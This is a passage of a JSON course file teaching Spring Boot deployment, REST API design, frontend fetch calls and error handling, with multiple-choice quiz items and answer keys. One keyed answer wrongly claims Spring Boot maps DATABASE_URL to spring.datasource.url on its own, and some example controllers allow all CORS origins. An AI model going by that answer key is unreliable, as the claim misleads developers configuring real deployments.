              "content": "Before deploying to production, verify:\n\nSECURITY:\n[ ] No secrets in code or git history\n[ ] HTTPS only (Railway handles this)\n[ ] Secure password/JWT generation\n[ ] CORS configured correctly\n[ ] Rate limiting if needed\n\nDATABASE:\n[ ] Connection pooling configured\n[ ] Migrations work (Flyway/Liquibase)\n[ ] Backups configured (Railway does this)\n[ ] DDL-auto set to 'validate' or 'none' in production\n\nPERFORMANCE:\n[ ] Logging level set to WARN/ERROR\n[ ] Debug endpoints disabled\n[ ] Caching configured if needed\n\nMONITORING:\n[ ] Health endpoints enabled\n[ ] Error tracking (Sentry, etc.)\n[ ] Logging aggregation\n\nDEPLOYMENT:\n[ ] Zero-downtime deployments\n[ ] Rollback plan\n[ ] Environment variables set\n\nCOMMON PRODUCTION SETTINGS:\n\n# application-production.properties\nspring.jpa.hibernate.ddl-auto=validate\nspring.jpa.show-sql=false\nlogging.level.root=WARN\nlogging.level.com.yourcompany=INFO\nserver.error.include-stacktrace=never\nserver.error.include-message=never"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "devops-lesson-5-mc-1",
              "title": "Environment Variables",
              "description": "Understanding Spring Boot configuration",
              "question": "How does Spring Boot read the environment variable DATABASE_URL?",
              "options": [
                "You must explicitly call System.getenv(\"DATABASE_URL\") in your code",
                "Spring Boot automatically maps it to spring.datasource.url",
                "You must define it in application.properties first",
                "Railway automatically injects it into application.properties file"
              ],
              "correctAnswer": 1,
              "explanation": "Spring Boot has built-in support for environment variables. DATABASE_URL is a special case that Spring Boot's DataSource auto-configuration recognizes and uses for the database connection. For custom variables, Spring Boot converts them: MY_CUSTOM_VAR becomes my.custom.var in properties.",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "devops-lesson-5-mc-2",
              "title": "Health Checks",
              "description": "Understanding production health monitoring",
              "question": "Your app starts successfully but the /actuator/health endpoint returns 503. What does Railway do?",
              "options": [
                "Nothing - the app started successfully",
                "Waits indefinitely for health check to pass",
                "Marks deployment as failed and rolls back to the previous version",
                "Sends a warning but keeps the new version running"
              ],
              "correctAnswer": 2,
              "explanation": "Railway uses health checks to verify deployments succeed. A 503 (Service Unavailable) means the app isn't healthy. Railway will mark the deployment as failed and automatically roll back to the previous working version. This prevents broken code from reaching users.",
              "difficulty": "intermediate"
            }
          ]
        }
      ],
      "order": 14
    },
    {
      "id": "module-full-stack",
      "title": "Full-Stack Development",
      "description": "Connect frontend to backend, implement complete features, and deploy to production.",
      "difficulty": "beginner",
      "estimatedHours": 4.9,
      "lessons": [
        {
          "id": "epoch-8-lesson-1",
          "title": "Lesson 15.1: Connecting Frontend to Your API",
          "moduleId": "module-full-stack",
          "order": 1,
          "estimatedMinutes": 30,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Users Need Interfaces",
              "content": "Your Spring Boot API is amazing:\n- GET /api/users returns user data\n- POST /api/users creates users\n\nBut normal users don't type URLs and read JSON!\n\nThey need:\n- Buttons to click\n- Forms to fill out\n- Visual displays\n\nThis is where FRONTEND comes in:\n- HTML (structure)\n- CSS (styling)\n- JavaScript (interactivity)"
            },
            {
              "type": "KEY_POINT",
              "title": "Frontend is the Storefront, Backend is the Warehouse",
              "content": "BACKEND (Your Java API):\n= Warehouse\n- Stores all products (data)\n- Processes orders (business logic)\n- Customers never see it directly\n\nFRONTEND (HTML/JS/React):\n= Storefront\n- Beautiful display\n- Shopping cart UI\n- Checkout forms\n- What customers interact with\n\nThey communicate:\nCustomer clicks \"Buy\" button (frontend)\n→ Sends request to API (backend)\n→ Backend processes order\n→ Sends confirmation (frontend displays it)"
            },
            {
              "type": "THEORY",
              "title": "Fetching Data from JavaScript",
              "content": "Your API endpoint:\nGET /api/users/1 → {\"name\": \"Alice\", \"age\": 20}\n\nJavaScript code to call it:\n\nfetch('http://localhost:8080/api/users/1')\n  .then(response => response.json())\n  .then(user => {\n    console.log(user.name);  // \"Alice\"\n    document.getElementById('username').textContent = user.name;\n  });\n\nThis:\n1. Sends HTTP GET request to your API\n2. Receives JSON response\n3. Displays it on the webpage\n\nFull-stack = Backend (Java) + Frontend (HTML/JS) working together!"
            },
            {
              "type": "WARNING",
              "title": "Common Frontend-Backend Connection Mistakes",
              "content": "CORS ERRORS:\nBrowser blocks requests from different origins by default.\nFix: Add @CrossOrigin annotation to your Spring controllers.\n\nHARDCODED URLS:\nDon't hardcode 'localhost:8080' in production code!\nFix: Use environment variables or config files.\n\nNO ERROR HANDLING:\nFetch doesn't throw on HTTP errors (404, 500).\nFix: Always check response.ok before processing.\n\nMIXED CONTENT:\nHTTPS pages can't call HTTP APIs.\nFix: Use HTTPS everywhere in production.\n\nJSON PARSING ERRORS:\nForgetting Content-Type header on POST requests.\nFix: Always set headers: { 'Content-Type': 'application/json' }"
            }
          ],
          "challenges": []
        },
        {
          "id": "epoch-8-lesson-2",
          "title": "Lesson 15.2: Full-Stack Feature - End to End",
          "moduleId": "module-full-stack",
          "order": 2,
          "estimatedMinutes": 50,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Complete Picture: Database → Backend → Frontend",
              "content": "Let's build a complete \"User List\" feature:\n\n1. DATABASE (MySQL/PostgreSQL):\nCREATE TABLE users (\n    id BIGINT PRIMARY KEY AUTO_INCREMENT,\n    name VARCHAR(100) NOT NULL,\n    email VARCHAR(255) UNIQUE,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\n2. BACKEND (Spring Boot):\nEntity, Repository, Service, Controller\n\n3. FRONTEND (HTML + JavaScript):\nDisplay users, add new user form"
            },
            {
              "type": "THEORY",
              "title": "Step 1: Backend Entity and Repository",
              "content": "@Entity\npublic class User {\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n    \n    private String name;\n    private String email;\n    \n    @CreationTimestamp\n    private LocalDateTime createdAt;\n    \n    // Getters and setters\n}\n\npublic interface UserRepository extends JpaRepository<User, Long> {\n    // Spring generates all methods\n}"
            },
            {
              "type": "THEORY",
              "title": "Step 2: Backend Service and Controller",
              "content": "@Service\npublic class UserService {\n    @Autowired\n    private UserRepository userRepository;\n    \n    public List<User> getAllUsers() {\n        return userRepository.findAll();\n    }\n    \n    public User createUser(User user) {\n        return userRepository.save(user);\n    }\n}\n\n@RestController\n@RequestMapping(\"/api/users\")\n@CrossOrigin(origins = \"*\")  // Allow frontend to call API\npublic class UserController {\n    @Autowired\n    private UserService userService;\n    \n    @GetMapping\n    public List<User> getAll() {\n        return userService.getAllUsers();\n    }\n    \n    @PostMapping\n    public User create(@RequestBody User user) {\n        return userService.createUser(user);\n    }\n}\n\nNow: http://localhost:8080/api/users returns JSON"
            },
            {
              "type": "THEORY",
              "title": "Step 3: Frontend HTML",
              "content": "<!DOCTYPE html>\n<html>\n<head>\n    <title>User Manager</title>\n</head>\n<body>\n    <h1>Users</h1>\n    \n    <!-- Display users -->\n    <div id=\"userList\"></div>\n    \n    <!-- Add user form -->\n    <h2>Add User</h2>\n    <form id=\"addUserForm\">\n        <input type=\"text\" id=\"name\" placeholder=\"Name\" required>\n        <input type=\"email\" id=\"email\" placeholder=\"Email\" required>\n        <button type=\"submit\">Add User</button>\n    </form>\n    \n    <script src=\"app.js\"></script>\n</body>\n</html>"
            },
            {
              "type": "THEORY",
              "title": "Step 4: Frontend JavaScript",
              "content": "const API_URL = 'http://localhost:8080/api/users';\n\n// Load users when page loads\nwindow.onload = function() {\n    loadUsers();\n};\n\n// Fetch and display users\nfunction loadUsers() {\n    fetch(API_URL)\n        .then(response => response.json())\n        .then(users => {\n            const userList = document.getElementById('userList');\n            userList.innerHTML = '';\n            \n            users.forEach(user => {\n                const div = document.createElement('div');\n                div.textContent = `${user.name} (${user.email})`;\n                userList.appendChild(div);\n            });\n        })\n        .catch(error => console.error('Error:', error));\n}\n\n// Add new user\ndocument.getElementById('addUserForm').onsubmit = function(e) {\n    e.preventDefault();\n    \n    const user = {\n        name: document.getElementById('name').value,\n        email: document.getElementById('email').value\n    };\n    \n    fetch(API_URL, {\n        method: 'POST',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify(user)\n    })\n    .then(response => response.json())\n    .then(() => {\n        loadUsers();  // Refresh list\n        e.target.reset();  // Clear form\n    });\n};"
            },
            {
              "type": "KEY_POINT",
              "title": "The Full Flow",
              "content": "USER ACTION:\n1. User fills form, clicks \"Add User\"\n\nFRONTEND:\n2. JavaScript captures form data\n3. fetch() sends POST to http://localhost:8080/api/users\n4. Sends JSON: {\"name\":\"Alice\",\"email\":\"alice@email.com\"}\n\nBACKEND:\n5. @PostMapping receives request\n6. @RequestBody converts JSON to User object\n7. UserService.createUser() called\n8. UserRepository.save() inserts to database\n\nDATABASE:\n9. INSERT INTO users...\n10. Returns generated ID\n\nBACKEND RESPONSE:\n11. Return User object as JSON\n12. Status: 200 OK\n\nFRONTEND:\n13. Receives response\n14. Calls loadUsers() to refresh list\n15. GET /api/users\n16. Displays updated user list\n\nCOMPLETE CYCLE!"
            },
            {
              "type": "WARNING",
              "title": "Full-Stack Development Pitfalls",
              "content": "N+1 QUERY PROBLEM:\nLoading 100 users with their orders = 101 database queries!\nFix: Use @EntityGraph or JOIN FETCH for related entities.\n\nCIRCULAR JSON REFERENCES:\nUser has Orders, Order has User = infinite JSON loop!\nFix: Use @JsonIgnore or DTOs to break the cycle.\n\nMISSING @TRANSACTIONAL:\nLazy-loaded entities fail outside of session.\nFix: Add @Transactional to service methods that load relationships.\n\nFRONTEND STATE OUT OF SYNC:\nUser creates item but list doesn't update.\nFix: Always refresh data after mutations or use optimistic updates."
            }
          ],
          "challenges": []
        },
        {
          "id": "epoch-8-lesson-3",
          "title": "Lesson 15.3: REST API Design - Professional Standards",
          "moduleId": "module-full-stack",
          "order": 3,
          "estimatedMinutes": 45,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "What Makes a Good REST API?",
              "content": "REST = Representational State Transfer\n\nA well-designed API should be:\n\n✓ INTUITIVE - Easy to understand and use\n✓ CONSISTENT - Follows predictable patterns\n✓ DISCOVERABLE - Clear what each endpoint does\n✓ SCALABLE - Can handle growth\n✓ WELL-DOCUMENTED - Clear examples and responses\n\nBAD API:\nPOST /createNewUser\nGET /getUserById?id=123\nPOST /deleteUser\n\nGOOD API:\nPOST /api/users\nGET /api/users/123\nDELETE /api/users/123\n\nThe difference? HTTP methods + resource-based URLs!"
            },
            {
              "type": "THEORY",
              "title": "Resource Naming Conventions (2024-2025 Standards)",
              "content": "RULE 1: Use PLURAL NOUNS for collections:\n✓ /api/users (not /api/user)\n✓ /api/orders (not /api/order)\n✓ /api/products (not /api/product)\n\nRULE 2: Use KEBAB-CASE for multi-word names:\n✓ /api/shipping-addresses\n✓ /api/order-items\n❌ /api/shippingAddresses (camelCase)\n❌ /api/shipping_addresses (snake_case)\n\nRULE 3: NO VERBS in URLs:\n❌ /api/createUser\n❌ /api/getUsers\n❌ /api/deleteOrder\n\nWhy? The HTTP METHOD is the verb!\n✓ POST /api/users (create)\n✓ GET /api/users (retrieve)\n✓ DELETE /api/orders/123 (delete)\n\nRULE 4: Nesting to ONE level for relationships:\n✓ /api/users/123/orders (user's orders)\n✓ /api/orders/456/items (order's items)\n❌ /api/users/123/orders/456/items/789/details (too deep!)"
            },
            {
              "type": "KEY_POINT",
              "title": "HTTP Methods are Like Restaurant Actions",
              "content": "Imagine managing a restaurant menu database:\n\n📖 GET /api/menu-items\nAction: Browse the menu\nLike: Customer looking at menu\nChanges nothing, just reads\n\n➕ POST /api/menu-items\nAction: Add new dish to menu\nLike: Chef creates new recipe\nServer generates ID, returns location\n\n🔄 PUT /api/menu-items/123\nAction: Replace entire menu item\nLike: Completely redesign a dish\nMust send ALL fields (name, price, ingredients)\n\n✏️ PATCH /api/menu-items/123\nAction: Update only price\nLike: Just change the price tag\nSend only changed fields: {\"price\": 15.99}\n\n🗑️ DELETE /api/menu-items/123\nAction: Remove from menu\nLike: Discontinue a dish\nItem gone, can't be retrieved"
            },
            {
              "type": "THEORY",
              "title": "The 5 Essential HTTP Methods",
              "content": "GET - Retrieve data:\n@GetMapping(\"/api/products\")\npublic List<Product> getAll() { }\n\n@GetMapping(\"/api/products/{id}\")\npublic Product getById(@PathVariable Long id) { }\n\nPOST - Create new resource:\n@PostMapping(\"/api/products\")\npublic ResponseEntity<Product> create(@RequestBody Product product) {\n    Product saved = productService.save(product);\n    return ResponseEntity\n        .created(URI.create(\"/api/products/\" + saved.getId()))\n        .body(saved);\n}\n\nPUT - Replace entire resource:\n@PutMapping(\"/api/products/{id}\")\npublic Product replace(@PathVariable Long id, @RequestBody Product product) {\n    return productService.replace(id, product);\n}\n\nPATCH - Partial update:\n@PatchMapping(\"/api/products/{id}\")\npublic Product update(@PathVariable Long id, @RequestBody Map<String, Object> updates) {\n    return productService.partialUpdate(id, updates);\n}\n\nDELETE - Remove resource:\n@DeleteMapping(\"/api/products/{id}\")\npublic ResponseEntity<Void> delete(@PathVariable Long id) {\n    productService.delete(id);\n    return ResponseEntity.noContent().build();\n}"
            },
            {
              "type": "THEORY",
              "title": "HTTP Status Codes - The Response Language",
              "content": "2xx - SUCCESS:\n200 OK - Request succeeded (GET, PUT, PATCH)\n201 Created - Resource created (POST)\n204 No Content - Success but no data to return (DELETE)\n\n4xx - CLIENT ERRORS (User's fault):\n400 Bad Request - Invalid data sent\n401 Unauthorized - Not authenticated (no login)\n403 Forbidden - Authenticated but not authorized\n404 Not Found - Resource doesn't exist\n409 Conflict - Duplicate or conflicting data\n422 Unprocessable Entity - Validation failed\n429 Too Many Requests - Rate limit exceeded\n\n5xx - SERVER ERRORS (Our fault):\n500 Internal Server Error - Something broke\n503 Service Unavailable - Server down/overloaded\n\nExample in Spring Boot:\n\n@PostMapping(\"/api/users\")\npublic ResponseEntity<User> create(@Valid @RequestBody User user) {\n    if (userService.existsByEmail(user.getEmail())) {\n        return ResponseEntity.status(HttpStatus.CONFLICT)\n            .body(null);  // 409 Conflict\n    }\n    User saved = userService.save(user);\n    return ResponseEntity\n        .status(HttpStatus.CREATED)  // 201 Created\n        .body(saved);\n}"
            },
            {
              "type": "KEY_POINT",
              "title": "Consistent Response Structure",
              "content": "Always return JSON in a predictable format:\n\nSUCCESS Response:\n{\n  \"data\": {\n    \"id\": 123,\n    \"name\": \"Product Name\",\n    \"price\": 29.99\n  },\n  \"timestamp\": \"2025-01-15T10:30:00Z\"\n}\n\nERROR Response:\n{\n  \"error\": {\n    \"code\": 404,\n    \"message\": \"Product not found\",\n    \"details\": \"No product exists with ID 123\"\n  },\n  \"timestamp\": \"2025-01-15T10:30:00Z\",\n  \"path\": \"/api/products/123\"\n}\n\nSpring Boot Implementation:\n\npublic record ApiResponse<T>(T data, LocalDateTime timestamp) {\n    public ApiResponse(T data) {\n        this(data, LocalDateTime.now());\n    }\n}\n\n@GetMapping(\"/api/products/{id}\")\npublic ResponseEntity<ApiResponse<Product>> getProduct(@PathVariable Long id) {\n    Product product = productService.findById(id);\n    return ResponseEntity.ok(new ApiResponse<>(product));\n}"
            },
            {
              "type": "THEORY",
              "title": "Pagination for Large Collections",
              "content": "DON'T return thousands of items at once!\n\nBAD:\nGET /api/products\nReturns: 50,000 products (crashes browser)\n\nGOOD:\nGET /api/products?page=0&size=20\nReturns: First 20 products + metadata\n\nResponse format:\n{\n  \"content\": [\n    {\"id\": 1, \"name\": \"Product 1\"},\n    {\"id\": 2, \"name\": \"Product 2\"}\n  ],\n  \"page\": 0,\n  \"size\": 20,\n  \"totalElements\": 500,\n  \"totalPages\": 25\n}\n\nSpring Data JPA makes this easy:\n\n@GetMapping(\"/api/products\")\npublic Page<Product> getAll(\n        @RequestParam(defaultValue = \"0\") int page,\n        @RequestParam(defaultValue = \"20\") int size) {\n    Pageable pageable = PageRequest.of(page, size);\n    return productRepository.findAll(pageable);\n}\n\nFILTERING:\nGET /api/products?category=electronics&minPrice=100\n\n@GetMapping(\"/api/products\")\npublic List<Product> search(\n        @RequestParam(required = false) String category,\n        @RequestParam(required = false) Double minPrice) {\n    return productService.search(category, minPrice);\n}"
            },
            {
              "type": "THEORY",
              "title": "API Versioning",
              "content": "APIs evolve. Don't break existing clients!\n\nVERSIONING STRATEGIES:\n\n1. URL Path (Most common):\n/api/v1/users\n/api/v2/users\n\n@RestController\n@RequestMapping(\"/api/v1/users\")\npublic class UserControllerV1 { }\n\n@RestController\n@RequestMapping(\"/api/v2/users\")\npublic class UserControllerV2 { }\n\n2. Header-based:\nGET /api/users\nHeader: Accept: application/vnd.myapi.v1+json\n\nWhen to version:\n✓ Breaking changes (removed fields)\n✓ Changed response structure\n✓ Different authentication method\n\nDON'T version for:\n✓ Bug fixes\n✓ Adding optional fields\n✓ Performance improvements"
            },
            {
              "type": "THEORY",
              "title": "⚠️ Common REST API Mistakes to Avoid",
              "content": "❌ MISTAKE 1: Verbs in URLs\nPOST /api/createUser\nFIX: POST /api/users\n\n❌ MISTAKE 2: Wrong HTTP methods\nGET /api/users/delete/123\nFIX: DELETE /api/users/123\n\n❌ MISTAKE 3: Returning wrong status codes\nreturn ResponseEntity.ok(null);  // 200 when nothing found\nFIX: return ResponseEntity.notFound().build();  // 404\n\n❌ MISTAKE 4: Exposing database structure\n/api/users?query=SELECT * FROM users\nFIX: /api/users?role=admin&status=active\n\n❌ MISTAKE 5: No rate limiting\nAnyone can call your API 1000000 times/second\nFIX: Implement rate limiting (429 status code)\n\n❌ MISTAKE 6: Returning passwords or sensitive data\n{\"id\": 1, \"name\": \"Alice\", \"password\": \"secret123\"}\nFIX: Use @JsonIgnore or DTOs to exclude sensitive fields"
            },
            {
              "type": "THEORY",
              "title": "💻 Complete REST Controller with Best Practices",
              "content": "```java\n@RestController\n@RequestMapping(\"/api/v1/products\")\n@Validated\npublic class ProductController {\n    private final ProductService productService;\n    \n    public ProductController(ProductService productService) {\n        this.productService = productService;\n    }\n    \n    // GET all (with pagination)\n    @GetMapping\n    public ResponseEntity<Page<Product>> getAll(\n            @RequestParam(defaultValue = \"0\") int page,\n            @RequestParam(defaultValue = \"20\") int size) {\n        Pageable pageable = PageRequest.of(page, size);\n        Page<Product> products = productService.findAll(pageable);\n        return ResponseEntity.ok(products);  // 200 OK\n    }\n    \n    // GET one\n    @GetMapping(\"/{id}\")\n    public ResponseEntity<Product> getById(@PathVariable Long id) {\n        return productService.findById(id)\n            .map(ResponseEntity::ok)  // 200 OK\n            .orElse(ResponseEntity.notFound().build());  // 404 Not Found\n    }\n    \n    // POST (create)\n    @PostMapping\n    public ResponseEntity<Product> create(\n            @Valid @RequestBody Product product) {\n        Product saved = productService.save(product);\n        URI location = URI.create(\"/api/v1/products/\" + saved.getId());\n        return ResponseEntity.created(location).body(saved);  // 201 Created\n    }\n    \n    // PUT (replace)\n    @PutMapping(\"/{id}\")\n    public ResponseEntity<Product> replace(\n            @PathVariable Long id,\n            @Valid @RequestBody Product product) {\n        if (!productService.exists(id)) {\n            return ResponseEntity.notFound().build();  // 404\n        }\n        Product updated = productService.replace(id, product);\n        return ResponseEntity.ok(updated);  // 200 OK\n    }\n    \n    // PATCH (partial update)\n    @PatchMapping(\"/{id}\")\n    public ResponseEntity<Product> update(\n            @PathVariable Long id,\n            @RequestBody Map<String, Object> updates) {\n        return productService.partialUpdate(id, updates)\n            .map(ResponseEntity::ok)  // 200 OK\n            .orElse(ResponseEntity.notFound().build());  // 404\n    }\n    \n    // DELETE\n    @DeleteMapping(\"/{id}\")\n    public ResponseEntity<Void> delete(@PathVariable Long id) {\n        if (!productService.exists(id)) {\n            return ResponseEntity.notFound().build();  // 404\n        }\n        productService.delete(id);\n        return ResponseEntity.noContent().build();  // 204 No Content\n    }\n}\n\nThis controller demonstrates:\n✓ Correct HTTP methods\n✓ Proper status codes\n✓ Resource-based URLs (no verbs)\n✓ Pagination support\n✓ Validation with @Valid\n✓ Constructor injection\n✓ API versioning in path\n```"
            }
          ],
          "challenges": []
        },
        {
          "id": "epoch-8-lesson-4",
          "title": "Lesson 15.4: Error Handling - From Database to UI",
          "moduleId": "module-full-stack",
          "order": 4,
          "estimatedMinutes": 50,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Full-Stack Error Journey",
              "content": "Errors can occur at ANY layer:\n\nDATABASE:\n- Connection timeout\n- Constraint violation (duplicate email)\n- Transaction rollback\n\nBACKEND (Spring Boot):\n- Validation error (@NotBlank, @Email)\n- Business logic error (insufficient funds)\n- Resource not found (user ID doesn't exist)\n- Authentication/authorization failure\n\nNETWORK:\n- 500 Internal Server Error\n- 404 Not Found\n- Timeout\n\nFRONTEND (JavaScript):\n- Network failure (no internet)\n- JSON parsing error\n- Display error to user\n\nGOAL: Catch errors everywhere, provide clear feedback!"
            },
            {
              "type": "KEY_POINT",
              "title": "Error Handling is Like a Hospital Emergency Response",
              "content": "PATIENT EMERGENCY (Error occurs):\n\n1. FIRST RESPONDERS (Try-Catch at source):\n   Paramedics identify the problem immediately\n   Like: Validation catches bad input right away\n\n2. EMERGENCY ROOM (Backend exception handler):\n   Doctors diagnose and treat the condition\n   Like: @RestControllerAdvice catches all exceptions\n   Returns: Structured diagnosis (error code + message)\n\n3. FAMILY NOTIFICATION (Frontend UI):\n   Family gets clear, understandable information\n   Like: User sees \"Email already exists\"\n   NOT: \"SQLException: Duplicate key violation on idx_email\"\n\n4. MEDICAL RECORDS (Logging):\n   Everything documented for future analysis\n   Like: Server logs stack traces for debugging\n   User NEVER sees stack traces (security risk!)"
            },
            {
              "type": "THEORY",
              "title": "Backend: RFC 7807 Problem Details (Spring Boot 4)",
              "content": "Spring Framework 6 introduced ProblemDetail (RFC 7807 standard):\n\nStandard error response format:\n{\n  \"type\": \"https://api.example.com/errors/not-found\",\n  \"title\": \"Resource Not Found\",\n  \"status\": 404,\n  \"detail\": \"User with ID 123 does not exist\",\n  \"instance\": \"/api/users/123\",\n  \"timestamp\": \"2025-01-15T10:30:00Z\"\n}\n\nImplementation:\n\n@RestControllerAdvice\npublic class GlobalExceptionHandler {\n    \n    @ExceptionHandler(ResourceNotFoundException.class)\n    public ProblemDetail handleNotFound(ResourceNotFoundException ex,\n                                         HttpServletRequest request) {\n        ProblemDetail problem = ProblemDetail.forStatusAndDetail(\n            HttpStatus.NOT_FOUND,\n            ex.getMessage()\n        );\n        problem.setType(URI.create(\"https://api.example.com/errors/not-found\"));\n        problem.setTitle(\"Resource Not Found\");\n        problem.setProperty(\"timestamp\", Instant.now());\n        return problem;\n    }\n    \n    @ExceptionHandler(MethodArgumentNotValidException.class)\n    public ProblemDetail handleValidation(\n            MethodArgumentNotValidException ex) {\n        ProblemDetail problem = ProblemDetail.forStatusAndDetail(\n            HttpStatus.BAD_REQUEST,\n            \"Validation failed\"\n        );\n        problem.setTitle(\"Invalid Input\");\n        \n        // Extract validation errors\n        Map<String, String> errors = new HashMap<>();\n        ex.getBindingResult().getFieldErrors().forEach(error -> {\n            errors.put(error.getField(), error.getDefaultMessage());\n        });\n        problem.setProperty(\"errors\", errors);\n        return problem;\n    }\n}"
            },
            {
              "type": "THEORY",
              "title": "Custom Business Exceptions",
              "content": "Create meaningful exception classes:\n\n// Base exception\npublic class BusinessException extends RuntimeException {\n    private final String errorCode;\n    \n    public BusinessException(String message, String errorCode) {\n        super(message);\n        this.errorCode = errorCode;\n    }\n    \n    public String getErrorCode() {\n        return errorCode;\n    }\n}\n\n// Specific exceptions\npublic class ResourceNotFoundException extends BusinessException {\n    public ResourceNotFoundException(String resource, Long id) {\n        super(resource + \" with ID \" + id + \" not found\", \"RESOURCE_NOT_FOUND\");\n    }\n}\n\npublic class DuplicateResourceException extends BusinessException {\n    public DuplicateResourceException(String message) {\n        super(message, \"DUPLICATE_RESOURCE\");\n    }\n}\n\npublic class InsufficientFundsException extends BusinessException {\n    public InsufficientFundsException(double available, double required) {\n        super(\"Insufficient funds. Available: \" + available + \n              \", Required: \" + required, \"INSUFFICIENT_FUNDS\");\n    }\n}\n\nUsage in service:\n\n@Service\npublic class UserService {\n    \n    public User findById(Long id) {\n        return userRepository.findById(id)\n            .orElseThrow(() -> new ResourceNotFoundException(\"User\", id));\n    }\n    \n    public User create(User user) {\n        if (userRepository.existsByEmail(user.getEmail())) {\n            throw new DuplicateResourceException(\n                \"Email \" + user.getEmail() + \" is already registered\"\n            );\n        }\n        return userRepository.save(user);\n    }\n}"
            },
            {
              "type": "KEY_POINT",
              "title": "Security: Never Expose Stack Traces!",
              "content": "❌ BAD - Exposes internal details:\n{\n  \"error\": \"java.sql.SQLException: Duplicate entry 'alice@email.com'\",\n  \"stackTrace\": [\n    \"at com.example.UserRepository.save(UserRepository.java:42)\",\n    \"at com.example.UserService.create(UserService.java:28)\",\n    ...\n  ]\n}\n\nSECURITY RISKS:\n- Reveals database structure\n- Shows internal file paths\n- Exposes technology stack\n- Helps attackers understand your system\n\n✓ GOOD - User-friendly message:\n{\n  \"status\": 409,\n  \"title\": \"Duplicate Resource\",\n  \"detail\": \"This email address is already registered\",\n  \"errorCode\": \"DUPLICATE_RESOURCE\",\n  \"timestamp\": \"2025-01-15T10:30:00Z\"\n}\n\nMeanwhile, on the SERVER:\nLOG: Full stack trace for developers\nLOG: Request details, user ID, timestamp\nLOG: SQL query that failed\n\nImplementation:\n\n@RestControllerAdvice\npublic class GlobalExceptionHandler {\n    \n    private static final Logger logger = \n        LoggerFactory.getLogger(GlobalExceptionHandler.class);\n    \n    @ExceptionHandler(Exception.class)\n    public ProblemDetail handleGenericException(\n            Exception ex, HttpServletRequest request) {\n        \n        // LOG everything for developers\n        logger.error(\"Unexpected error at {}: {}\", \n                    request.getRequestURI(), ex.getMessage(), ex);\n        \n        // RETURN safe message to user\n        ProblemDetail problem = ProblemDetail.forStatusAndDetail(\n            HttpStatus.INTERNAL_SERVER_ERROR,\n            \"An unexpected error occurred. Please try again later.\"\n        );\n        problem.setTitle(\"Internal Server Error\");\n        \n        // Include error ID for support team\n        String errorId = UUID.randomUUID().toString();\n        problem.setProperty(\"errorId\", errorId);\n        logger.error(\"Error ID: {}\", errorId);\n        \n        return problem;\n    }\n}"
            },
            {
              "type": "THEORY",
              "title": "Frontend: Handling Errors in JavaScript",
              "content": "MODERN APPROACH - async/await with try-catch:\n\nasync function createUser(userData) {\n    try {\n        const response = await fetch('http://localhost:8080/api/users', {\n            method: 'POST',\n            headers: { 'Content-Type': 'application/json' },\n            body: JSON.stringify(userData)\n        });\n        \n        // Check HTTP status\n        if (!response.ok) {\n            // Parse error response\n            const error = await response.json();\n            \n            // Handle different error types\n            if (response.status === 409) {\n                displayError('Email already exists. Please use a different email.');\n            } else if (response.status === 400) {\n                displayValidationErrors(error.errors);\n            } else if (response.status === 500) {\n                displayError('Server error. Please try again later.');\n            } else {\n                displayError(error.detail || 'An error occurred');\n            }\n            return null;\n        }\n        \n        // Success\n        const user = await response.json();\n        displaySuccess('User created successfully!');\n        return user;\n        \n    } catch (error) {\n        // Network error (no response from server)\n        if (error.name === 'TypeError' && error.message.includes('fetch')) {\n            displayError('Cannot connect to server. Check your internet connection.');\n        } else {\n            displayError('An unexpected error occurred: ' + error.message);\n        }\n        console.error('Error creating user:', error);\n        return null;\n    }\n}"
            },
            {
              "type": "THEORY",
              "title": "Displaying Errors to Users",
              "content": "Create user-friendly error displays:\n\nHTML:\n<div id=\"errorContainer\" class=\"error-message\" style=\"display: none;\">\n    <span id=\"errorText\"></span>\n    <button onclick=\"closeError()\">×</button>\n</div>\n\n<div id=\"successContainer\" class=\"success-message\" style=\"display: none;\">\n    <span id=\"successText\"></span>\n</div>\n\nCSS:\n.error-message {\n    background-color: #f8d7da;\n    color: #721c24;\n    padding: 12px;\n    border: 1px solid #f5c6cb;\n    border-radius: 4px;\n    margin: 10px 0;\n}\n\n.success-message {\n    background-color: #d4edda;\n    color: #155724;\n    padding: 12px;\n    border: 1px solid #c3e6cb;\n    border-radius: 4px;\n    margin: 10px 0;\n}\n\nJavaScript:\nfunction displayError(message) {\n    const errorContainer = document.getElementById('errorContainer');\n    const errorText = document.getElementById('errorText');\n    errorText.textContent = message;\n    errorContainer.style.display = 'block';\n    \n    // Auto-hide after 5 seconds\n    setTimeout(() => {\n        errorContainer.style.display = 'none';\n    }, 5000);\n}\n\nfunction displaySuccess(message) {\n    const successContainer = document.getElementById('successContainer');\n    const successText = document.getElementById('successText');\n    successText.textContent = message;\n    successContainer.style.display = 'block';\n    \n    setTimeout(() => {\n        successContainer.style.display = 'none';\n    }, 3000);\n}\n\nfunction displayValidationErrors(errors) {\n    const messages = Object.entries(errors)\n        .map(([field, message]) => `${field}: ${message}`)\n        .join('\\n');\n    displayError(messages);\n}"
            },
            {
              "type": "THEORY",
              "title": "💻 Complete Full-Stack Error Flow",
